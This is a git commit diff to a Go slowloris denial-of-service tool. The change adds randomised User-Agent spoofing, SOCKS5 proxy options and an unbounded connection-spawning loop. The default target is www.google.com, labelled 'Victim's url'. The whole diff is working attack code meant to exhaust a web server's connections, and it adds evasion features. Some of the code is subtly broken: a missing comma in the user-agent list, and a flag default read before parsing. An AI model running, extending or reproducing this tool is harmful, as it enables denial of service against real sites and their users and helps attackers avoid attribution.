dedd8ac60f1709f3df365f8603fd6f6277c8be24
Ajdin Halac <halac.ajdin@nsoft.com>
2019-03-09 22:48:39 +0100

    Implement random user agent generation

--- main.go
+++ main.go
@@ -6,91 +6,105 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math/rand"
 	"net"
 	"net/url"
 	"runtime"
-	"strings"
 	"time"
 )
 
 var (
-	contentLength    = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes. Adjust to nginx's client_max_body_size")
-	dialWorkersCount = flag.Int("dialWorkersCount", 10, "The number of workers simultaneously busy with opening new TCP connections")
-	goMaxProcs       = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
-	rampUpInterval   = flag.Duration("rampUpInterval", time.Second, "Interval between new connections' acquisitions for a single dial worker (see dialWorkersCount)")
-	sleepInterval    = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout")
-	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
-	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url. Http POST must be allowed in nginx config for this url")
-	hostHeader       = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
+	contentLength     = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes. Adjust to nginx client_max_body_size")
+	sleepInterval     = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx client_body_timeout")
+	https             = flag.Bool("https", false, "Whether to use tls or not")
+	randUserAgent     = flag.Bool("randUserAgent", false, "Randomizes user-agents with each request")
+	destinationHost   = flag.String("destinationHost", "www.google.com", "Victim's url. Http POST must be allowed in nginx config for this url")
+	destinationPort   = flag.String("destinationPort", "80", "Victim's port.")
+	hostHeader        = flag.String("hostHeader", *destinationHost, "Host header value in case it is different than the hostname in victimUrl")
+	proxyHost         = flag.String("proxyHost", "127.0.0.1", "SOCKS5 proxy host")
+	proxyPort         = flag.String("proxyPort", "80", "SOCKS5 proxy port")
 )
 
 var (
 	sharedReadBuf  = make([]byte, 4096)
 	sharedWriteBuf = []byte("A")
-
 	tlsConfig = &tls.Config{
 		InsecureSkipVerify: true,
+	}
+	userAgents     = []string{
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+		"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
 	}
 )
 
 func main() {
+	runtime.GOMAXPROCS(runtime.NumCPU())
+	rand.Seed(time.Now().UTC().UnixNano())
+
 	flag.Parse()
 	flag.VisitAll(func(f *flag.Flag) {
 		fmt.Printf("%s=%v\n", f.Name, f.Value)
 	})
 
-	runtime.GOMAXPROCS(*goMaxProcs)
-
-	victimUri, err := url.Parse(*victimUrl)
+	destinationHostPort := net.JoinHostPort("//" + *destinationHost, *destinationPort)
+	destinationUri, err := url.Parse(destinationHostPort)
 	if err != nil {
-		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", victimUrl, err)
+		log.Fatalf("Cannot parse destinationUrl=[%s]: [%s]\n", destinationHostPort, err)
 	}
-	victimHostPort := victimUri.Host
-	if !strings.Contains(victimHostPort, ":") {
-		port := "80"
-		if victimUri.Scheme == "https" {
-			port = "443"
-		}
-		victimHostPort = net.JoinHostPort(victimHostPort, port)
-	}
-	host := victimUri.Host
-	if len(*hostHeader) > 0 {
-		host = *hostHeader
-	}
-	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
-		victimUri.RequestURI(), host, *contentLength))
 
-	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
-	activeConnectionsCh := make(chan int, *dialWorkersCount)
-	go activeConnectionsCounter(activeConnectionsCh)
-	for i := 0; i < *dialWorkersCount; i++ {
-		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
-		time.Sleep(dialWorkersLaunchInterval)
-	}
-	time.Sleep(*testDuration)
-}
-
-func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri *url.URL, requestHeader []byte) {
-	isTls := victimUri.Scheme == "https"
 	for {
-		time.Sleep(*rampUpInterval)
-		conn := dialVictim(victimHostPort, isTls)
+		go dialWorker(destinationHostPort, generateRequestHeader(destinationUri.RequestURI()))
+	}
+}
+
+func generateRequestHeader(uri string) []byte  {
+	userAgent := ""
+	if *randUserAgent {
+		userAgent = "\nUser-Agent: " + userAgents[rand.Intn(len(userAgents))]
+	}
+	return []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s%s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n", uri, *hostHeader, userAgent,*contentLength))
+}
+
+func dialWorker(destinationHostPort string, requestHeader []byte) {
+	for {
+		conn := dialDestination(destinationHostPort)
 		if conn != nil {
-			go doLoris(conn, victimUri, activeConnectionsCh, requestHeader)
+			go doLoris(conn, requestHeader)
 		}
 	}
 }
 
-func activeConnectionsCounter(ch <-chan int) {
-	var connectionsCount int
-	for n := range ch {
-		connectionsCount += n
-		log.Printf("Holding %d connections\n", connectionsCount)
-	}
-}
-
-func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
+func dialDestination(hostPort string) io.ReadWriteCloser {
 	// TODO hint: add support for dialing the victim via a random proxy from the given pool.
+	//dialer, err := proxy.SOCKS5("tcp", hostPort, nil, nil)
+	//if err != nil {
+	//	log.Printf("Couldn't setup proxy to [%s]: [%s]\n", hostPort, err)
+	//	return nil
+	//}
+
 	conn, err := net.Dial("tcp", hostPort)
 	if err != nil {
 		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
@@ -106,7 +120,7 @@ func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 	if err = tcpConn.SetLinger(0); err != nil {
 		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
 	}
-	if !isTls {
+	if !*https {
 		return tcpConn
 	}
 
@@ -119,16 +133,13 @@ func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 	return tlsConn
 }
 
-func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int, requestHeader []byte) {
+func doLoris(conn io.ReadWriteCloser, requestHeader []byte) {
 	defer conn.Close()
 
 	if _, err := conn.Write(requestHeader); err != nil {
 		log.Printf("Cannot write requestHeader=[%v]: [%s]\n", requestHeader, err)
 		return
 	}
-
-	activeConnectionsCh <- 1
-	defer func() { activeConnectionsCh <- -1 }()
 
 	readerStopCh := make(chan int, 1)
 	go nullReader(conn, readerStopCh)
